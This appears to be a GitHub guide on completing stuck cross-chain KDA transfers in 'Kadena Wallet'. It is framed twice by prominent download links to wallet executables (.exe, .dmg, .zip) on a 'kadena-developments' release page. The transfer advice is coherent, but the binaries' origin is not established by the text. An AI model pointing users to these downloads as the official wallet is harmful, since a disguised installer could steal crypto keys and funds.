![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Stuck Cross-Chain Transfer in Kadena Wallet: Finish It, Don't Resend</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

A cross-chain transfer in Kadena is two transactions wearing one name. The source chain debits your account and produces a proof; the destination chain credits the recipient when that proof is submitted. When someone says a transfer is stuck, almost always the first half succeeded and the second half was never sent.

That distinction decides everything that follows, because the fix is to finish an existing operation, not to start a new one.

## You'll see this if

- A transfer shows as sent, but the destination balance never changed.
- The wallet reports a pending state that does not resolve.
- You closed the wallet mid-transfer, or the machine restarted.
- An explorer shows your debit on one chain and nothing on the other.

## What a complete transfer looks like

| Stage | What happens | Where it is visible |
| --- | --- | --- |
| 1. Initiate | The source chain records the debit and yields transfer details | Source chain |
| 2. Include | The source chain includes the transaction in a block | Source chain |
| 3. Prove | A proof of inclusion is produced for the destination | Source chain |
| 4. Continue | The proof is submitted to the destination chain | Destination chain |
| 5. Credit | The destination verifies and credits or creates the account | Destination chain |

Stages one to three happen together from your point of view. Stage four is the one that goes missing, and stage five is what you are waiting for when you refresh a screen that will never change on its own.

## Why the second half does not happen

- **The wallet was closed too early.** The continuation is a separate submission. If the application exits between halves, nothing sends it later unless the application tracks pending work on restart.
- **The node rejected the continuation.** Insufficient gas on the destination, an unreachable endpoint, or a transient error will do it.
- **The proof expired.** Proofs have a validity window, and a transfer completed after that window needs a fresh proof rather than the original.
- **The destination account could not be built.** Sending to a fresh name on the far side requires constructing it as part of the operation, guard included. If those details were wrong or absent, the second submission cannot land.
- **The chain is not the one you think.** A transfer to a name on chain 0 when the recipient watches chain 1 is complete and invisible.

## Find the handle before you do anything

Every cross-chain transfer has a request key, and the transaction hash is the handle you need. It is the only reliable way to ask "what state is this in".

1. Open the wallet's activity list and copy the transaction hash, not a screenshot.
2. Paste the hash into a community explorer.
3. Read which chain included it, and whether a continuation appears against it.
4. Check the destination chain for the credited amount or for the account's absence.

If the hash is not found at all, the transfer never reached a node. That is a different problem, and it belongs to whatever you submitted through rather than to the transfer itself.

## Completing it

1. **Open the wallet on the destination chain** before anything else, so the interface is looking at the right place.
2. **Locate the pending transfer** in the activity or pending list, using the hash from above.
3. **Submit the continuation.** The wallet needs the proof and the destination details, both of which belong to the original request.
4. **Approve the fee** on the destination chain. This is a second transaction and it costs gas.
5. **Wait for inclusion on the destination**, then confirm the balance there rather than in a summary view.
6. **Keep the hash in your own notes** until the recipient side shows the credit.

If the wallet cannot complete it, a second wallet or the reference command-line tool can, provided it accepts the request key and can reach a working node. What it cannot do is invent the first half.

## Why resending makes it worse

The source chain already debited you. Sending again starts a second transfer, debits you a second time, and leaves two operations in flight with different request keys. Now the destination may credit twice, or once, and reconciling which is which becomes the actual problem.

The rule is simple: one request key, one transfer. Finish that one or abandon it deliberately, but do not duplicate it.

## When the window has closed

Proofs are not valid forever. If enough time passed, the original proof can no longer be submitted, and the correct move is to generate a current one for the same request rather than to start over.

The destination chain's requirements decide this, not the wallet's opinion. If a tool refuses the proof as expired, ask it for a fresh proof instead of a new transfer.

## Prevention

- **Leave the wallet open** until the transfer reports completion on both chains.
- **Keep the hash** somewhere outside the application, because the application may not survive the process.
- **Check the destination chain first** when a transfer looks lost; most are simply credited elsewhere.
- **Confirm the recipient's account exists** before sending to a new name on a new chain.
- **Avoid starting a second transfer** to "push it through". That instinct is what turns one pending transfer into two permanent ones.

## FAQ

**Is my money gone if the transfer never completes?**
The source debit is real and recorded. What is missing is the credit on the other chain, and that is completable with the original request while its proof remains valid.

**How long should a transfer take?**
Each chain targets roughly thirty seconds per block, and a cross-chain transfer needs inclusion on two chains plus a proof. Minutes, not seconds, is the normal expectation.

**Can I cancel it?**
There is no cancel. The two options are completing the continuation or abandoning the transfer and treating the debit as spent.

**Why does the wallet show pending when the explorer shows success?**
The explorer is reporting one chain. The wallet may be summarising two. Trust the chain-specific view.

**Does closing the app lose the transfer?**
No, the request stays on-chain. It may, however, mean nothing submits the second half, which is why the hash matters.

## Related reading

- Cross-chain transfers in Kadena Wallet: how the twenty chains connect
- Choosing a chain in Kadena Wallet: why balances differ
- How to send KDA from Kadena Wallet safely
- Why your KDA balance shows zero, and where it really is

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Sending KDA from Kadena Wallet: Four Checks Before You Press Send](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/how-to-send-kda-from-kadena-wallet.md)
- [Why Your KDA Balance Shows Zero, and Where It Really Is](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/why-kadena-balance-shows-zero-in-wallet.md)
- [Exchange Deposit Not Showing? The Chain Mismatch Behind It](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/exchange-deposit-not-showing-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
